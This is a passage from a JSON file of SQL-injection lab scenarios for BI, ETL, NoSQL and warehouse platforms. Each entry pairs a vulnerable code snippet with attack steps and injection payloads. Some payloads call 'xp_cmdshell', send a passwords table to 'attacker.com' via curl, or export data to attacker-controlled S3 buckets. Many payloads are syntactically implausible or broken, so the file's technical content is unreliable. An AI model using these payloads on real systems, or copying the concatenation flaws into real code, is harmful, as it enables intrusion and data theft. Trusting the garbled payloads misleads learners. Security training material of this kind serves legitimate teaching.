          "' UNION SELECT * FROM $system.discovery_schema--",
          "1' FROM (SELECT * FROM information_schema.tables)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Google Data Studio Community Connectors",
        "Lab Description": "A Google Data Studio community connector uses user-provided config values in SQL queries. The configuration parameters get concatenated directly into BigQuery jobs, allowing injection through connector settings.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify connector config points",
          "Inject through config parameters",
          "Trigger report execution",
          "Bypass connector validation",
          "Compromise linked BigQuery datasets"
        ],
        "Vulnerability name": "Data Studio Connector Injection",
        "srcCode": "function getData(request) {\n  const query = `SELECT * FROM \\`${request.configParams.dataset}\\`.${request.configParams.table}\n  WHERE ${request.configParams.filter}`;\n  return BigQuery.query(query);\n}",
        "payloads": [
          "dataset.table` WHERE 1=1) UNION SELECT * FROM `dataset.secrets`--",
          "legit_dataset.legit_table` FROM (SELECT * FROM `INFORMATION_SCHEMA.TABLES`)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Salesforce Apex Dynamic SOQL",
        "Lab Description": "A Salesforce Apex controller builds SOQL queries with unsanitized user input. The string concatenation allows breaking out of SOQL context into underlying SQL execution during batch processing.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify dynamic SOQL endpoints",
          "Inject through Visualforce parameters",
          "Trigger batch Apex execution",
          "Bypass SOQL injection protections",
          "Access restricted Salesforce objects"
        ],
        "Vulnerability name": "Salesforce SOQL Injection",
        "srcCode": "public class UserController {\n  public static List<User> getUsers(String filter) {\n    return Database.query('SELECT Id, Name FROM User WHERE ' + filter);\n  }\n}",
        "payloads": [
          "IsActive = true FROM Contact--",
          "Name LIKE '%' FROM (SELECT NamespacePrefix FROM Organization) LIMIT 1--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Oracle APEX Interactive Report SQL",
        "Lab Description": "An Oracle APEX application builds interactive reports with user-modifiable SQL. The source queries get concatenated directly into report generation, allowing injection through column filter parameters.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify interactive report regions",
          "Modify column filter values",
          "Trigger report refresh",
          "Bypass APEX escaping mechanisms",
          "Access all application workspace data"
        ],
        "Vulnerability name": "APEX Report Injection",
        "srcCode": "BEGIN\n  apex_util.ir_filter(\n    p_page_id => 1,\n    p_report_column => 'DEPARTMENT',\n    p_filter_value => :P1_FILTER\n  );\nEND;",
        "payloads": [
          "'||(SELECT table_name FROM all_tables WHERE rownum=1)||'",
          "' UNION SELECT username, password FROM apex_workspace_access_users--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in SAP HANA Calculation View Parameters",
        "Lab Description": "A SAP HANA calculation view accepts user-provided parameters in SQL script nodes. The parameter values get embedded directly into script execution, allowing injection through analytical query inputs.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify calculation view parameters",
          "Inject through analytical queries",
          "Bypass HANA script validation",
          "Execute commands in HANA context",
          "Exfiltrate data through calculation results"
        ],
        "Vulnerability name": "HANA Calculation View Injection",
        "srcCode": "CREATE CALCULATION VIEW \"SCHEMA\".\"VIEW\" \nAS SELECT * FROM \"TABLE\" \nWHERE \"COLUMN\" = ${parameter}",
        "payloads": [
          "1 FROM (SELECT * FROM SYS.USERS)--",
          "'1' UNION SELECT * FROM \"_SYS_BIC\".\"M_VIEWS\"--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in IBM Cognos Report Studio SQL",
        "Lab Description": "A Cognos Report Studio report uses dynamic SQL queries with user-provided prompt values. The prompt parameters get concatenated directly into query execution, allowing injection through report filters.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify report prompt parameters",
          "Inject through prompt values",
          "Trigger report execution",
          "Bypass Cognos parameterization",
          "Access all content store databases"
        ],
        "Vulnerability name": "Cognos Report Injection",
        "srcCode": "#prompt('param','string')#",
        "payloads": [
          "' UNION SELECT * FROM CMOBJECTS--",
          "1' FROM (SELECT * FROM CMNAMESPACES)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in MicroStrategy Report SQL Pass-Through",
        "Lab Description": "A MicroStrategy report uses SQL pass-through with user-modifiable query fragments. The SQL snippets get concatenated directly into dataset queries, allowing injection through attribute forms.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify SQL pass-through objects",
          "Modify attribute forms",
          "Trigger report execution",
          "Bypass MicroStrategy validation",
          "Compromise the metadata database"
        ],
        "Vulnerability name": "MicroStrategy SQL Pass Injection",
        "srcCode": "SELECT ${attribute_forms} FROM ${logical_table}",
        "payloads": [
          "* FROM (SELECT * FROM MSTR_META.METADATA_ENTITIES) x--",
          "id, name FROM table WHERE 1=1) UNION SELECT * FROM MSTR_USER.USERS--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Qlik Sense Load Script",
        "Lab Description": "A Qlik Sense app uses user-provided parameters in load script SQL queries. The parameter values get embedded directly into script execution, allowing injection through app variables.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify load script variables",
          "Inject through variable input",
          "Reload app data",
          "Bypass Qlik script validation",
          "Access all linked data connections"
        ],
        "Vulnerability name": "Qlik Load Script Injection",
        "srcCode": "SQL SELECT * FROM table WHERE field = '$(varFilter)'",
        "payloads": [
          "' UNION SELECT * FROM CONNECTIONS--",
          "1' FROM (SELECT * FROM SCRIPT_ERRORS)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Alteryx Input Data Tool SQL",
        "Lab Description": "An Alteryx workflow uses the Input Data tool with user-provided SQL queries. The query parameters get concatenated directly into tool configuration, allowing injection through workflow parameters.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify Input Data tools",
          "Inject through workflow parameters",
          "Run the workflow",
          "Bypass Alteryx validation",
          "Compromise all database connections"
        ],
        "Vulnerability name": "Alteryx Input Tool Injection",
        "srcCode": "SELECT * FROM ${TableName} WHERE ${FilterCondition}",
        "payloads": [
          "table WHERE 1=1) UNION SELECT * FROM sys.tables--",
          "users WHERE id = 1 FROM (SELECT * FROM sys.databases)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Informatica PowerCenter SQL Transformation",
        "Lab Description": "An Informatica workflow uses SQL Transformation with user-provided query fragments. The query portions get concatenated directly into transformation SQL, allowing injection through parameter files.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify SQL transformations",
          "Modify parameter files",
          "Run the workflow",
          "Bypass Informatica validation",
          "Access repository metadata"
        ],
        "Vulnerability name": "Informatica SQL Transform Injection",
        "srcCode": "SELECT ${columns} FROM ${table} WHERE ${condition}",
        "payloads": [
          "* FROM (SELECT * FROM REP_TABLES) x WHERE 1=1--",
          "id, name FROM users WHERE id = 1) UNION SELECT * FROM OPB_SWIDGINST--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Talend tDBInput Component",
        "Lab Description": "A Talend job uses tDBInput components with user-provided query parameters. The parameter values get concatenated directly into component queries, allowing injection through context variables.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify tDBInput components",
          "Inject through context variables",
          "Execute the job",
          "Bypass Talend escaping",
          "Access all configured connections"
        ],
        "Vulnerability name": "Talend Component Injection",
        "srcCode": "SELECT * FROM \" + context.table_name + \" WHERE \" + context.filter",
        "payloads": [
          "users WHERE 1=1) UNION SELECT * FROM CONTEXTS--",
          "table WHERE id = '1' FROM (SELECT * FROM TALEND_VARIABLES)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Pentaho Data Integration SQL Step",
        "Lab Description": "A Pentaho transformation uses Table Input steps with user-provided SQL fragments. The query portions get concatenated directly into step execution, allowing injection through transformation parameters.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify Table Input steps",
          "Inject through parameters",
          "Run the transformation",
          "Bypass Pentaho validation",
          "Access repository databases"
        ],
        "Vulnerability name": "Pentaho SQL Step Injection",
        "srcCode": "SELECT ${fields} FROM ${table} ${where_clause}",
        "payloads": [
          "* FROM (SELECT * FROM R_DATABASE) x WHERE 1=1--",
          "id, name FROM users WHERE id = 1) EXECUTE xp_cmdshell('whoami')--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Matillion ETL Query Components",
        "Lab Description": "A Matillion job uses Database Query components with user-provided SQL parameters. The parameter values get embedded directly into component queries, allowing injection through job variables.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify Database Query components",
          "Inject through variables",
          "Run the job",
          "Bypass Matillion validation",
          "Access all project connections"
        ],
        "Vulnerability name": "Matillion Query Component Injection",
        "srcCode": "SELECT * FROM ${var('table_name')} WHERE ${var('filter')}",
        "payloads": [
          "users WHERE 1=1) UNION SELECT * FROM matillion_metadata--",
          "table WHERE id = '1' FROM (SELECT * FROM matillion_variables)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Fivetran Connector Configuration",
        "Lab Description": "A Fivetran connector uses user-provided parameters in SQL queries during schema detection. The configuration values get concatenated directly into information schema queries, allowing injection through connector setup.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify connector configuration",
          "Inject through setup parameters",
          "Trigger schema refresh",
          "Bypass Fivetran validation",
          "Compromise all synced data"
        ],
        "Vulnerability name": "Fivetran Connector Injection",
        "srcCode": "SELECT * FROM information_schema.columns \nWHERE table_schema = '${config.schema}' \nAND table_name = '${config.table}'",
        "payloads": [
          "public' AND 1=0) UNION SELECT * FROM pg_user--",
          "legit' FROM (SELECT * FROM information_schema.tables) x--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Stitch Data Source SQL",
        "Lab Description": "A Stitch integration uses user-provided SQL for data extraction. The query parameters get concatenated directly into replication queries, allowing injection through integration settings.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify data source configuration",
          "Inject through replication SQL",
          "Trigger data sync",
          "Bypass Stitch validation",
          "Access all connected destinations"
        ],
        "Vulnerability name": "Stitch Data Source Injection",
        "srcCode": "SELECT ${fields} FROM ${table} WHERE ${incremental_key} > '${last_value}'",
        "payloads": [
          "* FROM (SELECT * FROM all_tables) x WHERE 1=1--",
          "id, name FROM users WHERE id = 1) UNION SELECT * FROM stitch_connections--"
        ]
      },


      
        {
          "Lab scenario": "SQL Injection in MongoDB $where Clause",
          "Lab Description": "A Node.js application uses user input directly in MongoDB's $where operator, which allows JavaScript evaluation. Attackers can break out of the query context and execute arbitrary JavaScript.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Identify endpoints using $where operator",
            "Craft JavaScript payload in query parameters",
            "Bypass input filters using Unicode escaping",
            "Execute system commands through JavaScript",
            "Exfiltrate data through error messages"
          ],
          "Vulnerability name": "MongoDB JS Injection",
          "srcCode": "db.users.find({ $where: function() { return this.username == '${userInput}' } })",
          "payloads": [
            "' || this.password == 'secret",
            "' || (function(){ return db.getCollectionNames() })() || '"
          ]
        },
        {
          "Lab scenario": "SQL Injection in DynamoDB Filter Expression",
          "Lab Description": "An AWS Lambda function builds DynamoDB filter expressions by concatenating user input. The expression evaluation allows breaking out into underlying SQL-like syntax.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Identify DynamoDB scan/query endpoints",
            "Inject through filter expression parameters",
            "Bypass DynamoDB attribute validation",
            "Access unauthorized tables",
            "Exfiltrate data through expression errors"
          ],
          "Vulnerability name": "DynamoDB Expression Injection",
          "srcCode": "const params = {\n  TableName: 'Users',\n  FilterExpression: 'username = ' + userInput\n};",
          "payloads": [
            "'admin' OR begins_with(password, 'a')",
            "'test' AND attribute_exists(SSN)"
          ]
        },
        {
          "Lab scenario": "SQL Injection in Cassandra CQL Prepared Statement Bypass",
          "Lab Description": "A Java application uses string concatenation for Cassandra CQL query parts before preparing statements, allowing injection through crafted parameters.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Identify non-parameterized CQL fragments",
            "Inject through WHERE clause parameters",
            "Bypass prepared statement protection",
            "Execute arbitrary CQL commands",
            "Access system keyspaces"
          ],
          "Vulnerability name": "Cassandra CQL Injection",
          "srcCode": "String query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\nPreparedStatement ps = session.prepare(query);",
          "payloads": [
            "' ALLOW FILTERING",
            "admin' AND password='secret' ALLOW FILTERING"
          ]
        },
        {
          "Lab scenario": "SQL Injection in Azure Cosmos DB SQL API",
          "Lab Description": "A .NET application builds Cosmos DB SQL queries by concatenating user input, allowing injection through crafted WHERE clauses.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Identify Cosmos DB SQL API endpoints",
            "Inject through query predicates",
            "Bypass parameterized query validation",
            "Access unauthorized collections",
            "Exfiltrate data through JOIN clauses"
          ],
          "Vulnerability name": "Cosmos DB SQL Injection",
          "srcCode": "var query = new QueryDefinition(\n  \"SELECT * FROM c WHERE c.username = '\" + username + \"'\"\n);",
          "payloads": [
            "' OR c.isAdmin = true",
            "test' JOIN p IN c.permissions WHERE p.level = 'admin'"
          ]
        },
        {
          "Lab scenario": "SQL Injection in Google Firestore REST API",
          "Lab Description": "A Firebase application uses user input directly in Firestore REST API filter parameters, allowing injection through crafted field paths.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Identify Firestore REST endpoints",
            "Inject through structuredQuery parameters",
            "Bypass Firestore security rules",
            "Access unauthorized documents",
            "Modify data through batch operations"
          ],
          "Vulnerability name": "Firestore REST Injection",
          "srcCode": "{ \"structuredQuery\": { \"where\": { \"fieldFilter\": { \"field\": { \"fieldPath\": \"username\" }, \"op\": \"EQUAL\", \"value\": { \"stringValue\": \"\" + userInput + \"\" } } } } }",
          "payloads": [
            "\"\\\" OR \\\"1\\\"=\\\"1\"",
            "admin\" }, { \"fieldPath\": \"password\" }] }"
          ]
        },
        {
          "Lab scenario": "SQL Injection in ArangoDB AQL Query",
          "Lab Description": "A JavaScript application builds ArangoDB AQL queries by concatenating user input, allowing injection through crafted FILTER clauses.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Identify AQL query endpoints",
            "Inject through FILTER conditions",
            "Bypass bind parameter validation",
            "Access system collections",
            "Execute JavaScript functions"
          ],
          "Vulnerability name": "ArangoDB AQL Injection",
          "srcCode": "const query = aql`FOR doc IN users FILTER doc.username == '${userInput}' RETURN doc`;",
          "payloads": [
            "' OR doc.isAdmin == true",
            "test' || doc.password != '' RETURN doc"
          ]
        },
        {
          "Lab scenario": "SQL Injection in CouchDB Mango Query",
          "Lab Description": "A Python application builds CouchDB Mango queries by concatenating user input in selector expressions, allowing injection through crafted JSON.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Identify Mango query endpoints",
            "Inject through selector parameters",
            "Bypass JSON validation",
            "Access system databases",
            "Execute admin functions"
          ],
          "Vulnerability name": "CouchDB Mango Injection",
          "srcCode": "selector = {\"username\": {\"$eq\": \"${userInput}\"}}",
          "payloads": [
            "\"}}, {\"password\": {\"$exists\": true}",
            "admin\"}, \"$or\": [{\"roles\": \"admin\"}]}"
          ]
        },
        {
          "Lab scenario": "SQL Injection in InfluxDB CLI Command",
          "Lab Description": "A bash script builds InfluxDB CLI commands by concatenating user input, allowing injection through crafted query parameters.",
          "Difficulty Level": "Medium",
          "Solution Steps": [
            "Identify Influx CLI execution points",
            "Inject through query parameters",
            "Bypass command line escaping",
            "Access internal measurements",
            "Execute system commands"
          ],
          "Vulnerability name": "Influx CLI Injection",
          "srcCode": "influx -execute 'SELECT * FROM \"metrics\" WHERE \"host\" = \\''\"$userInput\"'\\''",
          "payloads": [
            "' OR 1=1--",
            "localhost' FROM \"_internal\"..\"database\"--"
          ]
        },
        {
          "Lab scenario": "SQL Injection in Neo4j Cypher Shell",
          "Lab Description": "A Java application builds Neo4j Cypher queries by concatenating user input in shell commands, allowing injection through crafted node properties.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Identify Cypher shell execution points",
            "Inject through node property filters",
            "Bypass shell escaping",
            "Execute system procedures",
            "Dump entire graph"
          ],
          "Vulnerability name": "Neo4j Shell Injection",
          "srcCode": "Runtime.getRuntime().exec(\"cypher-shell -u neo4j -p password 'MATCH (n:User) WHERE n.username = \\\"\" + username + \"\\\" RETURN n'\");",
          "payloads": [
            "\" OR 1=1 RETURN n",
            "admin\" WITH n CALL dbms.procedures() YIELD name RETURN name--"
          ]
        },
        {
          "Lab scenario": "SQL Injection in Amazon Redshift UNLOAD Command",
          "Lab Description": "A data pipeline builds Redshift UNLOAD commands with user-provided S3 paths, allowing injection through crafted credentials strings.",
          "Difficulty Level": "Hard",
          "Solution Steps": [
            "Identify UNLOAD command execution points",
            "Inject through S3 path parameters",
            "Bypass IAM role validation",
            "Exfiltrate data to attacker-controlled buckets",
            "Execute remote commands"
          ],
          "Vulnerability name": "Redshift UNLOAD Injection",
          "srcCode": "UNLOAD ('SELECT * FROM users') TO '${s3Path}'\nCREDENTIALS 'aws_access_key_id=${key};aws_secret_access_key=${secret}'",          
          "payloads": [
            "s3://attacker-bucket/ WITH (FORMAT CSV)) COPY users TO 's3://attacker-bucket/leak'--",
            "s3://legit-bucket/' CREDENTIALS 'aws_access_key_id=AKIA...') GRANT ALL TO attacker--"
          ]
        },



        
        
            {
              "Lab scenario": "SQL Injection in PostgreSQL FDW (Foreign Data Wrapper) OPTIONS Clause",
              "Lab Description": "A multi-database system dynamically creates PostgreSQL foreign data wrappers with user-controlled OPTIONS parameters. The OPTIONS string is concatenated directly into the FDW creation query without proper escaping, allowing attackers to break out of the wrapper configuration context and execute arbitrary SQL commands when the foreign server is accessed. This is particularly dangerous as it can compromise linked database systems.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify FDW creation endpoints in application code",
                "Craft malicious OPTIONS string containing SQL payload",
                "Bypass FDW syntax validation using comment sequences",
                "Trigger foreign table access to execute payload",
                "Pivot attack through database links to connected systems"
              ],
              "Vulnerability name": "PostgreSQL FDW OPTIONS Injection",
              "srcCode": "CREATE SERVER foreign_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '\" + userHost + \"', dbname '\" + userDb + \"')",
              "payloads": [
                "localhost', dbname 'test')) RETURNS TABLE(cmd text) AS $$ BEGIN RETURN QUERY EXECUTE 'COPY (SELECT * FROM passwords) TO PROGRAM ''curl attacker.com'''; END; $$ LANGUAGE plpgsql--",
                "attacker.com', port '5432', dbname 'legit_db' options 'connect_timeout=30'"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Snowflake External Function HEADERS Parameter",
              "Lab Description": "A Snowflake data pipeline uses external functions that pass HTTP headers directly into SQL queries during result processing. The header values are concatenated without proper sanitization when building the function's metadata queries, allowing injection through crafted API gateway requests. This vulnerability is particularly dangerous as it bypasses Snowflake's normal parameterized query protections.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify external functions using HEADERS parameter",
                "Intercept and modify HTTP requests to the API gateway",
                "Craft malicious header values containing SQL payload",
                "Bypass Snowflake's header validation mechanisms",
                "Exfiltrate data through function result processing"
              ],
              "Vulnerability name": "Snowflake External Function Header Injection",
              "srcCode": "CREATE EXTERNAL FUNCTION process_data(data STRING) RETURNS STRING HEADERS = {'user-id': '\" + userId + \"'} API_INTEGRATION = api_int AS 'https://api.example.com/process'",
              "payloads": [
                "' FROM (SELECT * FROM information_schema.tables)--",
                "1'); SELECT system$whitelist()--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Azure Cosmos DB Stored Procedure Context",
              "Lab Description": "An Azure Cosmos DB application uses JavaScript stored procedures that dynamically build SQL queries with user-provided input from the procedure's context object. The input is concatenated directly into the query text without proper sanitization, allowing attackers to break out of the stored procedure's execution context and access unauthorized collections. This vulnerability is particularly dangerous in multi-tenant Cosmos DB implementations.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify stored procedure execution endpoints",
                "Craft malicious input in the context object",
                "Bypass Cosmos DB's JavaScript sandbox restrictions",
                "Access system collections through query chaining",
                "Exfiltrate data via JOIN clauses across collections"
              ],
              "Vulnerability name": "Cosmos DB Stored Procedure Injection",
              "srcCode": "function queryDocuments(context) { var query = 'SELECT * FROM c WHERE c.type = \\'' + context.getInput() + '\\''; context.getCollection().queryDocuments(collectionLink, query, callback); }",
              "payloads": [
                "' OR c._ts > 0--",
                "test' JOIN t IN c.tags WHERE t.name = 'admin'--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Google BigQuery Scripting Variables",
              "Lab Description": "A BigQuery data pipeline uses scripting variables that are interpolated directly into dynamic SQL statements without proper escaping. The variables are set from user-controlled input and used in subsequent query steps, allowing attackers to break out of the variable context and execute arbitrary commands. This vulnerability is particularly dangerous in scheduled BigQuery scripts that process sensitive data.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify scripting variable declaration points",
                "Inject through variable assignment parameters",
                "Bypass BigQuery's script validation checks",
                "Chain multiple statements using semicolons",
                "Access INFORMATION_SCHEMA datasets"
              ],
              "Vulnerability name": "BigQuery Scripting Variable Injection",
              "srcCode": "DECLARE filter STRING DEFAULT '\" + userInput + \"'; EXECUTE IMMEDIATE 'SELECT * FROM dataset.table WHERE column = ''' || filter || '''';",
              "payloads": [
                "' OR 1=1--",
                "test' UNION ALL SELECT * FROM `region-us`.INFORMATION_SCHEMA.TABLES--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Snowflake Time Travel Queries",
              "Lab Description": "A data recovery system builds Snowflake time travel queries with user-controlled timestamp parameters. The timestamps are concatenated directly into AT/ BEFORE clauses without proper validation, allowing attackers to modify query behavior and access historical data beyond their privileges. This vulnerability is particularly dangerous in compliance scenarios where time travel is used for auditing.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Identify time travel query endpoints",
                "Inject through timestamp parameters",
                "Bypass time format validation",
                "Access deleted records from other schemas",
                "Recover sensitive data from table versions"
              ],
              "Vulnerability name": "Snowflake Time Travel Injection",
              "srcCode": "SELECT * FROM table AT(TIMESTAMP => '\" + userTimestamp + \"'::timestamp_ltz)",
              "payloads": [
                "2023-01-01 00:00:00'::timestamp_ltz) UNION SELECT * FROM information_schema.tables--",
                "current_timestamp() - interval '1 day') FROM (SELECT * FROM table_changes) x--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Databricks Notebook Widget Parameters",
              "Lab Description": "A Databricks notebook uses SQL widgets that accept user input which is then interpolated directly into Spark SQL queries without proper parameterization. The widget values are concatenated into the query text, allowing attackers to break out of the intended query structure. This vulnerability is particularly dangerous in shared notebook environments where multiple users have execution access.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Identify notebook widgets accepting SQL parameters",
                "Inject through widget input values",
                "Bypass Databricks parameter validation",
                "Execute commands in Spark context",
                "Access metastore tables through UNION queries"
              ],
              "Vulnerability name": "Databricks Widget Injection",
              "srcCode": "dbutils.widgets.text(\"input\", \"default\"); val query = s\"SELECT * FROM table WHERE column = '${dbutils.widgets.get(\"input\")}'\"; spark.sql(query)",
              "payloads": [
                "' UNION SELECT * FROM hive_metastore.default.secrets--",
                "test' FROM (SELECT explode(array(1,2,3)))--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Trino Dynamic Catalog Configuration",
              "Lab Description": "A Trino cluster allows dynamic catalog configuration through user-provided properties. The properties are concatenated directly into catalog initialization queries without proper escaping, allowing attackers to modify catalog behavior and access unauthorized data sources. This vulnerability is particularly dangerous in multi-catalog environments.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify catalog creation endpoints",
                "Inject through connector properties",
                "Trigger catalog refresh operations",
                "Bypass Trino security checks",
                "Compromise multiple connected data sources"
              ],
              "Vulnerability name": "Trino Catalog Configuration Injection",
              "srcCode": "CREATE CATALOG my_catalog WITH (connector.name = 'postgresql', connection-url = 'jdbc:postgresql://\" + userHost + \":5432/\" + userDb + \"')",
              "payloads": [
                "localhost/legit?ssl=true&user=postgres')) FROM (SELECT * FROM system.metadata.catalogs)--",
                "attacker.com/test?user=postgres&password=hack' FROM (SELECT 1) x) OR 1=1--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in ClickHouse External Dictionary Source",
              "Lab Description": "A ClickHouse cluster configures external dictionaries with user-provided source queries. The queries are concatenated directly into dictionary loading logic without proper sanitization, allowing attackers to modify dictionary behavior and access system tables. This vulnerability is particularly dangerous when dictionaries are configured to refresh automatically.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify external dictionary definitions",
                "Inject through source query parameters",
                "Trigger dictionary reload operations",
                "Bypass ClickHouse access controls",
                "Compromise dictionary contents"
              ],
              "Vulnerability name": "ClickHouse Dictionary Source Injection",
              "srcCode": "CREATE DICTIONARY my_dict (source = POSTGRESQL(query = 'SELECT * FROM \"\" + userTable + \"\"'))",
              "payloads": [
                "users WHERE 1=0) UNION SELECT * FROM system.processes--",
                "legit_table' FROM (SELECT * FROM merge_tree_settings) FORMAT CSV--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Druid SQL Query CONTEXT Parameters",
              "Lab Description": "A Druid cluster processes SQL queries with user-provided context parameters that are interpolated directly into native Druid queries. The parameters are used to modify query execution behavior and are concatenated without proper sanitization, allowing attackers to bypass Druid's SQL layer and execute native queries directly.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Identify query context parameters",
                "Inject through context values",
                "Bypass Druid SQL validation",
                "Execute native Druid queries",
                "Access system tables through context manipulation"
              ],
              "Vulnerability name": "Druid Context Parameter Injection",
              "srcCode": "{\"query\":\"SELECT * FROM datasource\",\"context\":{\"\" + paramName + \"\":\"\" + paramValue + \"\"}}",
              "payloads": [
                "\"sqlTimeZone\":\"UTC' FROM (SELECT * FROM sys.segments) x--\"",
                "\"maxScatterGatherBytes\":\"1000000\"},{\"malicious\":\"' UNION SELECT * FROM sys.servers--\""
              ]
            },
            {
              "Lab scenario": "SQL Injection in Hive Metastore PARTITION Clause",
              "Lab Description": "A Hive metastore service processes partition filters with user-provided expressions that are concatenated directly into metastore queries. The expressions are not properly sanitized, allowing attackers to bypass partition pruning restrictions and access unauthorized data partitions. This vulnerability is particularly dangerous in multi-tenant Hive implementations.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify partition filter endpoints",
                "Inject through partition expressions",
                "Bypass Hive query validation",
                "Access unauthorized partitions",
                "Exfiltrate metadata through filter injection"
              ],
              "Vulnerability name": "Hive Metastore Partition Injection",
              "srcCode": "SHOW PARTITIONS table PARTITION(\" + userFilter + \")",
              "payloads": [
                "dt='2023-01-01') FROM (SELECT * FROM PARTITIONS) x--",
                "category='books' OR (SELECT 1 FROM TBLS) IS NOT NULL--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Impala Admission Control QUERY_CONDITION",
              "Lab Description": "An Impala cluster processes admission control rules with user-provided conditions that are concatenated directly into policy evaluation queries. The conditions are not properly sanitized, allowing attackers to modify query prioritization and resource allocation. This vulnerability is particularly dangerous in shared Impala clusters with resource constraints.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify admission control endpoints",
                "Inject through rule conditions",
                "Bypass Impala validation checks",
                "Modify query prioritization",
                "Exfiltrate data through resource metrics"
              ],
              "Vulnerability name": "Impala Admission Control Injection",
              "srcCode": "CREATE POOL my_pool WITH ALLOCATION = 0.5 WITH QUERY_CONDITION = '\" + userCondition + \"'",
              "payloads": [
                "user = 'admin' FROM (SELECT * FROM functional.alltypes) x--",
                "memory > 1000) RETURNING *--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Presto Session Property Values",
              "Lab Description": "A Presto cluster accepts session properties that modify query execution behavior. The property values are concatenated directly into system queries without proper sanitization, allowing attackers to modify query plans and access unauthorized information. This vulnerability is particularly dangerous when session properties are set from user-controlled sources.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Identify session property endpoints",
                "Inject through property values",
                "Bypass property validation",
                "Modify query execution plans",
                "Exfiltrate data through session changes"
              ],
              "Vulnerability name": "Presto Session Property Injection",
              "srcCode": "SET SESSION optimize_hash_generation = '\" + userValue + \"'",
              "payloads": [
                "true' FROM (SELECT * FROM system.metadata.tables)--",
                "false'); INSERT INTO system.runtime.queries VALUES ('malicious')--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Filters",
              "Lab Description": "A CockroachDB changefeed sends data to webhooks with user-provided filter expressions that are concatenated directly into CDC queries. The filters are not properly sanitized, allowing attackers to modify changefeed behavior and access unauthorized data. This vulnerability is particularly dangerous in multi-tenant CockroachDB deployments.",
              "Difficulty Level": "Hard",
              "Solution Steps": [
                "Identify changefeed creation endpoints",
                "Inject through filter parameters",
                "Trigger changefeed events",
                "Bypass CDC validation",
                "Exfiltrate data through webhook payloads"
              ],
              "Vulnerability name": "CockroachDB CDC Filter Injection",
              "srcCode": "CREATE CHANGEFEED FOR TABLE users INTO 'webhook-https://callback.example.com' WITH filter = '\" + userFilter + \"'",
              "payloads": [
                "SELECT * FROM users WHERE type = 'admin'--",
                "SELECT *, (SELECT version()) FROM users--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension URLs",
              "Lab Description": "A data analysis tool uses DuckDB's HTTPFS extension with user-provided URLs that are concatenated directly into remote file access queries. The URLs are not properly sanitized, allowing attackers to break out of the file access context and execute arbitrary SQL commands. This vulnerability is particularly dangerous when accessing untrusted remote data sources.",
              "Difficulty Level": "Medium",
              "Solution Steps": [
                "Identify HTTPFS extension usage",
                "Inject through URL parameters",
                "Bypass file extension validation",
                "Execute remote commands",
                "Exfiltrate data through HTTP requests"
              ],
              "Vulnerability name": "DuckDB HTTPFS URL Injection",
              "srcCode": "SELECT * FROM read_csv('\" + userUrl + \"')",
              "payloads": [
                "http://attacker.com/payload') FROM (SELECT * FROM sqlite_master)--",
                "/tmp/test.csv' WITH (HEADER true)) RETURNING *--"
              ]
            },
            {
              "Lab scenario": "SQL Injection in Materialized View REFRESH OPTIONS",
